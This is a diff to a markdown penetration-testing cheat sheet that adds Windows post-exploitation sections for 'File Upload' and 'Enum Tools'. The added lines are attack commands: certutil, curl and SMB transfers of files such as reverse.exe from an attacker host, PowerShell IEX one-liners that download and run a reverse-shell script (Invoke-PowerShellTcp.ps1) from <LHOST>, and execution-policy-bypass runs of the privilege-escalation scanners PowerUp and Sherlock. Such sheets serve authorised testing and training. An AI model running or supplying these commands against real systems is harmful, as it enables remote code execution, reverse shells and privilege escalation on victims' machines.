@@ -519,6 +519,40 @@ Post Exploitation Windows
 
 <br>
 
+`File Upload`
+
+-    Starting Webserver  
+     `python3 -m http.server <LPORT>`  
+     
+-    Certutil  
+     `certutil -urlcache -f "http://<LHOST>:<LPORT>/<file>" <output-file>`  
+     
+-    SMB  
+     `on kali: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`  
+     `on target: copy \\<myip>\reverse.exe C:\tmp\reverse.exe`  
+     
+-    Powershell  
+     `cmd /c powershell IEX(new-object net.webclient).downloadstring('http://<LHOST>/Invoke-PowerShellTcp.ps1')`  
+     `powershell.exe IEX(new-object net.webclient).downloadstring('http://<LHOST>/Invoke-PowerShellTcp.ps1')`  
+     `powershell -c IEX(new-object net.webclient).downloadstring('http://<LHOST>/Invoke-PowerShellTcp.ps1')`  
+     
+-    Curl  
+     `curl http://<LHOST>/<file> -o <file>`  
+     
+<br>
+
+`Enum Tools`  
+
+-    [Powerup](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
+     `powershell -ep bypass; .\powerup.ps1; Invoke-AllChecks`  
+     
+-    [Sherlock](https://github.com/rasta-mouse/Sherlock)  
+     `powershell -ep bypass; Import-Module .\sherlock.ps1; Find-AllVulns`  
+     
+-    [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+
+<br>
+
 Active Directory
 ===============================================================================================
 
